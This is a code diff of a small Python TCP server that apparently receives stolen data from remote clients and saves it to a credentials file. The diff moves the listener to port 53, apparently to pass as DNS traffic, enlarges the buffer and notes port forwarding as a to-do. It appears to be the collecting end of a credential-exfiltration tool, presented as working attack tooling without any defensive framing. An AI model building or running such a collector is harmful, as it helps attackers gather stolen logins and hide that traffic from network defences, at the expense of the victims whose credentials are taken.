@@ -1,17 +1,21 @@
 #!/usr/bin/python3
 # _*_ coding: utf-8 _*_ 
 
+#to do
+#port-forwarding
+
+#increased the buffer size
 
 import socket
 
-FILENAME = 'credentials.txt'
+FILENAME = 'credentials.log'
 
 def main():
     #tcp connection
     server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 
     #binding the socket
-    server.bind(('',9090))
+    server.bind(('',53))
 
     #setting the server in listen mode
     server.listen()
@@ -20,10 +24,10 @@ def main():
     try:
         while True:  
             conn, addr = server.accept()     
-            print (f'Connection from {addr[0]} on port {addr[1]}')
+            print(f'Connection from {addr[0]} on port {addr[1]}')
         
             #decoding the data which is send by the client
-            data = conn.recv(1024).decode() 
+            data = conn.recv(4096).decode() 
 
             if not data:
                 continue
@@ -39,12 +43,12 @@ def main():
                         data = conn.recv(1024).decode()
         
             print('[+] Received Successfully!')
-
-
             conn.close() #closing the connection
 
     except KeyboardInterrupt:
         pass
 
 if __name__ == '__main__':
-    main() 
+    main()
+
+
